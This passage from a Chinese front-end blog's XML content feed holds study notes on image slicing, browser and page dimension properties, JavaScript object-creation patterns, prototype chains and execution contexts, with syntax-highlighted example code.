class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>6<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>江西、安徽<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>7<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>二区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>吉林、黑龙江、云南<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>10<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>6<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>三区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>新疆、西藏<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>15<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>10<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="获取css属性"><a href="#获取css属性" class="headerlink" title="获取css属性"></a>获取css属性</h2><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getStyle</span><span class="params">(obj, styleName)</span> </span>&#123; <span class="comment">//获取属性</span></div><div class="line">    <span class="keyword">if</span> (obj.currentStyle) &#123;</div><div class="line">        <span class="keyword">return</span> obj.currentStyle[styleName];</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> getComputedStyle(obj, <span class="literal">null</span>)[styleName];</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> html </tag>
            
            <tag> javascript </tag>
            
            <tag> css </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[切图]]></title>
      <url>/2017/04/10/Front%20End/%E5%88%87%E5%9B%BE/</url>
      <content type="html"><![CDATA[<p>从设计稿中切除网页的素材并在代码中引入图片<br><a id="more"></a></p>
<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>内容性图片: 指的是图片在页面是作为内容存在，如页面中的海报。(jpg)<br>修饰性图片: 指的是图片在页面中起修饰作用，如页面中的背景和图标。(png8,png24)  </p>
<p>jpg: 保存色彩丰富的内容性图片,对图片没有透明度要求,保存品质建议60-80<br>png8: 支持256种颜色,支持透明,设置无仿色,无杂边<br>png24: 支持半透明(ie6不支持半透明,改png8),对图片不进行压缩  </p>
<h2 id="隐藏文字"><a href="#隐藏文字" class="headerlink" title="隐藏文字"></a>隐藏文字</h2><p>1、直接在图层中隐藏文字图层<br>2、纯色背景时，通过选框工具+自由变换清除文字<br>3、不是纯色时，通过选框工具+移动工具+alt shift 拖动覆盖文字  </p>
<h2 id="PNG24切图方法"><a href="#PNG24切图方法" class="headerlink" title="PNG24切图方法"></a>PNG24切图方法</h2><ul>
<li>移动工具选中所需图层  </li>
<li>右键合并图层  </li>
<li>复制图层  </li>
</ul>
<h2 id="PNG8带背景切图方法"><a href="#PNG8带背景切图方法" class="headerlink" title="PNG8带背景切图方法"></a>PNG8带背景切图方法</h2><ul>
<li>合并可见图层  </li>
<li>矩形选框选择内容  </li>
<li>魔棒工具去除多余部分(alt)  </li>
</ul>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 切图 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript学习之浏览器宽高]]></title>
      <url>/2017/04/07/Front%20End/JS%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%BD%E9%AB%98/</url>
      <content type="html"><![CDATA[<p>Web中各种窗口宽高千奇百怪，不同浏览器对同一个属性解释又不尽相同，本文针对这些做一个粗略的总结。<br><a id="more"></a></p>
<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>1、一个页面的展示，从外到内的容器为：屏幕、浏览器以及页面本身。<br>2、HTML元素展现在页面内，页面展现在浏览器内，而浏览器展现在屏幕内。<br>3、通过Js的一些对象可以获取这些容器的高度、宽度。  </p>
<h2 id="屏幕"><a href="#屏幕" class="headerlink" title="屏幕"></a>屏幕</h2><ul>
<li>screen.height: 屏幕高度  </li>
<li>screen.width: 屏幕宽度  </li>
<li>screen.availHeight: 屏幕可用高度.即屏幕高度减去上下任务栏后的高度,可表示为软件最大化时的高度  </li>
<li>screen.availWidth: 屏幕可用宽度.即屏幕宽度减去左右任务栏后的宽度,可表示为软件最大化时的宽度  </li>
<li>任务栏高宽度: 屏幕高宽度-屏幕可用高宽度  </li>
</ul>
<h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><ul>
<li>window.outerHeight: 浏览器高度  </li>
<li>window.outerWidth: 浏览器宽度  </li>
<li>window.innerHeight: 浏览器内页面可用高度(包括垂直滚动条)  </li>
<li>window.innerWidth: 浏览器内页面可用宽度(包括水平滚动条)  </li>
<li>工具栏高度: 浏览器高度-浏览器内页面可用高度  </li>
</ul>
<h2 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h2><p>document.body.clientHeight: body的高度(包含padding)<br>document.body.clientWidth: body的宽度(包含padding)<br>document.body.offsetHeight: body的高度(包含padding、margin、border)<br>document.body.offsetWidth: body的宽度(包含padding、margin、border)<br>document.body.scrollTop: 网页被卷去的Top(滚动条)<br>document.body.scrollLeft: 网页被卷去的Left(滚动条)<br>document.body.scrollHeight: 网页正文全文高，包括有滚动条时的未见区域<br>document.body.scrollWidth: 网页正文全文宽，包括有滚动条时的未见区域<br>document.documentElement.clientHeight: 可见区域的高度<br>document.documentElement.clientWidth: 可见区域的宽度  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">body&#123;</div><div class="line">    <span class="attr">height</span>: <span class="number">4000</span>px;</div><div class="line">    margin: <span class="number">10</span>px;</div><div class="line">    padding: <span class="number">5</span>px;</div><div class="line">    border: <span class="number">1</span>px solid red;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line">Chrome、Opera、Safari</div><div class="line">*/</div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.body.clientHeight); <span class="comment">//4010</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.body.offsetHeight); <span class="comment">//4012</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.body.scrollHeight); <span class="comment">//4032</span></div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line">Firefox、IE11-8</div><div class="line">*/</div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.body.clientHeight); <span class="comment">//4010</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.body.offsetHeight); <span class="comment">//4012</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.body.scrollHeight); <span class="comment">//4010</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> BOM </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript学习之面向对象]]></title>
      <url>/2017/03/30/Front%20End/JS%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      <content type="html"><![CDATA[<p>ECMA-262把对象定义为：无序属性的集合，其属性可以包含基本值、对象或者函数。对象可以看成一组没有特定顺序的值，对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。<br><a id="more"></a></p>
<h2 id="一、创建对象"><a href="#一、创建对象" class="headerlink" title="一、创建对象"></a>一、创建对象</h2><p>1、创建一个Object实例  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="built_in">Object</span>();</div><div class="line">person.name = <span class="string">"Kylen"</span>;</div><div class="line">person.age = <span class="string">"20"</span>;</div><div class="line">person.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>2、使用对象字面量  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> person = &#123;</div><div class="line">    <span class="attr">name</span>: <span class="string">"Kylen"</span>,</div><div class="line">    <span class="attr">age</span>: <span class="number">20</span>,</div><div class="line">    <span class="attr">sayName</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="二、属性类型"><a href="#二、属性类型" class="headerlink" title="二、属性类型"></a>二、属性类型</h2><p>1、数据属性<br>    特性:</p>
<ul>
<li>configurable  </li>
<li>enumerable  </li>
<li>writable  </li>
<li>value  </li>
</ul>
<p>2、访问器属性<br>    特性:</p>
<ul>
<li>configurable  </li>
<li>enumerable  </li>
<li>get  </li>
<li>set  </li>
</ul>
<p>3、定义属性  </p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> person = &#123;&#125;;</div><div class="line"><span class="comment">//定义单个属性</span></div><div class="line">Object.defineProperty(person,<span class="string">"name"</span>,&#123;</div><div class="line">    configurable: <span class="literal">true</span>,</div><div class="line">    writable: <span class="literal">true</span>,</div><div class="line">    value: <span class="string">"Kylen"</span></div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="comment">//定义多个属性</span></div><div class="line">Object.defineProperties(person,&#123;</div><div class="line">    _year:&#123;</div><div class="line">        configurable: <span class="literal">true</span>,</div><div class="line">        writable: <span class="literal">true</span>,</div><div class="line">        value: <span class="number">2017</span></div><div class="line">    &#125;,</div><div class="line">    year:&#123;</div><div class="line">        <span class="keyword">get</span>: <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>._year;</div><div class="line">        &#125;,</div><div class="line">        <span class="keyword">set</span>: <span class="function"><span class="keyword">function</span><span class="params">(value)</span></span>&#123;</div><div class="line">            <span class="keyword">if</span>(value&gt;<span class="keyword">this</span>._year)&#123;</div><div class="line">                <span class="keyword">this</span>._year = value;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>4、获取特性  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> person = &#123;</div><div class="line">    <span class="attr">name</span>: <span class="string">"Kylen"</span>,</div><div class="line">    <span class="attr">age</span>: <span class="number">20</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(person,<span class="string">"name"</span>);</div><div class="line"><span class="built_in">console</span>.log(descriptor);</div></pre></td></tr></table></figure>
<h2 id="三、工厂模式"><a href="#三、工厂模式" class="headerlink" title="三、工厂模式"></a>三、工厂模式</h2><p>解决:使用同一个接口创建很多对象，产生大量重复代码。<br>缺点:无法知道对象的类型。每个实例包含的同名方法不共享。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPerson</span>(<span class="params">name,age</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</div><div class="line">    o.name = name;</div><div class="line">    o.age = age;</div><div class="line">    o.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> o;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> kol = createPerson(<span class="string">"Kol"</span>,<span class="number">17</span>);</div><div class="line"><span class="keyword">var</span> kylen = createPerson(<span class="string">"Kylen"</span>,<span class="number">20</span>);</div></pre></td></tr></table></figure>
<h2 id="四、构造函数模式"><a href="#四、构造函数模式" class="headerlink" title="四、构造函数模式"></a>四、构造函数模式</h2><p>解决:识别对象类型<br>缺点:每个实例包含的同名方法不共享。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age</span>)</span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">    <span class="keyword">this</span>.age = age;</div><div class="line">    <span class="keyword">this</span>.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> kol = <span class="keyword">new</span> Person(<span class="string">"Kol"</span>,<span class="number">17</span>);</div><div class="line"><span class="keyword">var</span> kylen = <span class="keyword">new</span> Person(<span class="string">"Kylen"</span>,<span class="number">20</span>);</div></pre></td></tr></table></figure>
<p>new关键字:</p>
<ul>
<li>声明一个中间对象。  </li>
<li>将该中间对象的原型指向构造函数的原型。  </li>
<li>将构造函数的this，指向该中间对象。  </li>
<li>返回该中间对象，即返回实例对象。  </li>
</ul>
<h2 id="五、原型模式"><a href="#五、原型模式" class="headerlink" title="五、原型模式"></a>五、原型模式</h2><p>解决:实例共享原型对象的属性和方法<br>缺点:引用类型的值被所有实例共享  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">&#125;</div><div class="line">Person.prototype.name = <span class="string">"Kol"</span>,</div><div class="line">Person.prototype.age = <span class="number">20</span>,</div><div class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</div></pre></td></tr></table></figure>
<p><img src="/images/原型对象.png" alt="原型对象">  </p>
<p>1、创建自定义构造函数后，其原型对象会默认有一个constructor属性。调用构造函数后创建的新实例有个内部属性[[prototype]]指向构造函数的对象。<br>2、代码读取某个对象的某个属性时，先搜索对象实例本身，如果没找到会搜索指针指向的原型对象，如果没找到会按照原型链找下去。<br>3、用<code>hasOwnProperty()</code>方法判断访问的是否是实例属性还是原型属性。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</div><div class="line">Person.prototype.name=<span class="string">"Kol"</span>;</div><div class="line">Person.prototype.age = <span class="number">20</span>;</div><div class="line"></div><div class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</div><div class="line"><span class="built_in">console</span>.log(person1.hasOwnProperty(<span class="string">"name"</span>)); <span class="comment">//false</span></div><div class="line">person1.name = <span class="string">"Kylen"</span>；</div><div class="line"><span class="built_in">console</span>.log(person1.hasOwnProperty(<span class="string">"name"</span>)); <span class="comment">//true</span></div><div class="line"><span class="keyword">delete</span> person1.name;</div><div class="line"><span class="built_in">console</span>.log(person1.hasOwnProperty(<span class="string">"name"</span>)); <span class="comment">//false</span></div></pre></td></tr></table></figure>
<p>4、用<code>in</code>判断访问的是否是当前对象的属性  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</div><div class="line">Person.prototype.name=<span class="string">"Kol"</span>;</div><div class="line">Person.prototype.age = <span class="number">20</span>;</div><div class="line"></div><div class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person();</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"name"</span> <span class="keyword">in</span> person1); <span class="comment">//true</span></div><div class="line">person1.name = <span class="string">"Kylen"</span>；</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"name"</span> <span class="keyword">in</span> person1); <span class="comment">//true</span></div></pre></td></tr></table></figure>
<h2 id="六、组合使用构造函数模式和原型模式"><a href="#六、组合使用构造函数模式和原型模式" class="headerlink" title="六、组合使用构造函数模式和原型模式"></a>六、组合使用构造函数模式和原型模式</h2><p>构造函数模式用于定义实例属性，原型模式用于定义方法和共享属性。  </p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span></span> Person(<span class="keyword">name</span>,age)&#123;</div><div class="line">    this.<span class="keyword">name</span> = <span class="keyword">name</span>;</div><div class="line">    this.age = age;</div><div class="line">&#125;</div><div class="line">Person.prototype = &#123;</div><div class="line">    constructor: Person,</div><div class="line">    sayName: <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</div><div class="line">        console.<span class="built_in">log</span>(this.<span class="keyword">name</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="七、原型链"><a href="#七、原型链" class="headerlink" title="七、原型链"></a>七、原型链</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">  <span class="keyword">this</span>.name = name;</div><div class="line">  <span class="keyword">this</span>.colors = [<span class="string">"red"</span>,<span class="string">"green"</span>];</div><div class="line">&#125;</div><div class="line"></div><div class="line">SuperType.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params">name,age</span>)</span>&#123;</div><div class="line">  SuperType.call(<span class="keyword">this</span>,name);</div><div class="line">  <span class="keyword">this</span>.age = age;</div><div class="line">&#125;</div><div class="line"></div><div class="line">SubType.prototype = <span class="keyword">new</span> SuperType();</div><div class="line">SubType.prototype.constructor = SubType;</div><div class="line">SubType.prototype.sayAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> kol = <span class="keyword">new</span> SubType(<span class="string">"Kol"</span>,<span class="number">17</span>);</div></pre></td></tr></table></figure>
<p><img src="/images/原型链.png" alt="原型链">  </p>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript学习之执行上下文]]></title>
      <url>/2017/03/25/Front%20End/JS%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87/</url>
      <content type="html"><![CDATA[<p>javascript引擎内部在执行代码以前到底做了些什么？<br><a id="more"></a></p>
<h2 id="一、执行上下文（Execution-Context）"><a href="#一、执行上下文（Execution-Context）" class="headerlink" title="一、执行上下文（Execution Context）"></a>一、执行上下文（Execution Context）</h2><p>1、每次当控制器转到可执行代码的时候，就会进入一个执行上下文。执行上下文可以理解为当前代码的执行环境，它会形成一个作用域。JavaScript中的运行环境大概包括三种情况。  </p>
<ul>
<li>全局级别的代码 - 这个是默认的代码运行环境，一旦代码被载入，引擎最先进入的就是这个环境。  </li>
<li>函数级别的代码 - 当执行一个函数时，运行函数体中的代码。  </li>
<li>Eval的代码 - 在Eval函数内运行的代码。  </li>
</ul>
<p>2、JavaScript引擎会以栈的方式来处理它们，这个栈，我们称其为函数调用栈(call stack)。栈底永远都是全局上下文，而栈顶就是当前正在执行的上下文。<br>3、当javascript代码文件被浏览器载入后，默认最先进入的是一个全局的执行上下文。当在全局上下文中调用执行一个函数时，程序流就进入该被调用函数内，此时引擎就会为该函数创建一个新的执行上下文，并且将其压入到执行上下文堆栈的顶部。浏览器总是执行当前在堆栈顶部的上下文，一旦执行完毕，该上下文就会从堆栈顶部被弹出，然后，进入其下的上下文执行代码。这样，堆栈中的上下文就会被依次执行并且弹出堆栈，直到回到全局的上下文。<br>4、执行上下文的特点  </p>
<ul>
<li>单线程  </li>
<li>同步执行，栈顶的上下文在执行中，其他的在等待  </li>
<li>唯一的一个全局上下文，在浏览器关闭时出栈  </li>
<li>函数的执行上下文的个数没有限制  </li>
<li>每次某个函数被调用，就会有个新的执行上下文为其创建，即使是调用的自身函数，也是如此。  </li>
</ul>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> name = <span class="string">"Kol"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> name = <span class="string">"Kylen"</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">var</span> name = <span class="string">"Kevin"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">var</span> name = <span class="string">"Katherine"</span>;</div><div class="line">    &#125;</div><div class="line">    b();</div><div class="line">    c();</div><div class="line">&#125;</div><div class="line">a();</div></pre></td></tr></table></figure>
<p><img src="/images/执行上下文栈操作.png" alt="栈操作">  </p>
<h2 id="二、执行上下文的生命周期"><a href="#二、执行上下文的生命周期" class="headerlink" title="二、执行上下文的生命周期"></a>二、执行上下文的生命周期</h2><p>我们已经知道，当控制器遇到可执行代码后，一个新的执行上下文就会被创建。而一个执行上下文的生命周期可以分为两个阶段。</p>
<ul>
<li>创建阶段: 在这个阶段中，执行上下文会分别创建变量对象，建立作用域链，以及确定this的指向  </li>
<li>代码执行阶段: 创建完成之后，就会开始执行代码，这个时候，会完成变量赋值，函数引用，以及执行其他代码。  </li>
</ul>
<p><img src="/images/EC生命周期.png" alt="EC生命周期">  </p>
<h2 id="三、变量对象的创建"><a href="#三、变量对象的创建" class="headerlink" title="三、变量对象的创建"></a>三、变量对象的创建</h2><p>变量对象的创建依次有三个步骤。<br>1、建立arguments对象。<br>2、检测使用function关键字声明的函数，在变量对象中以函数名建立一个属性，属性值是该函数的引用。如果检查到函数名已经存在，则会覆盖。<br>3、检测使用var关键字声明的变量，在变量对象中以变量名建立一个属性，属性值为undefined。如果检查到变量名已经存在，则跳过。  </p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(i)</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> a = <span class="number">1</span>;</div><div class="line">    <span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</div><div class="line">    </div><div class="line">    &#125;;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span><span class="params">()</span> </span>&#123;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">test(<span class="number">10</span>);</div></pre></td></tr></table></figure>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//test()执行上下文的创建过程</span></div><div class="line">EC = &#123;</div><div class="line"><span class="symbol">    VO:</span> &#123;&#125;, <span class="comment">// 变量对象</span></div><div class="line"><span class="symbol">    scopeChain:</span> &#123;&#125;, <span class="comment">//作用域链</span></div><div class="line"><span class="symbol">    this:</span> &#123;&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// VO 为 Variable Object的缩写，即变量对象</span></div><div class="line">VO = &#123;</div><div class="line"><span class="symbol">    arguments:</span> &#123;</div><div class="line">        <span class="number">0</span>: <span class="number">10</span>,</div><div class="line"><span class="symbol">        length:</span> <span class="number">1</span></div><div class="line">    &#125;,</div><div class="line"><span class="symbol">    i:</span> <span 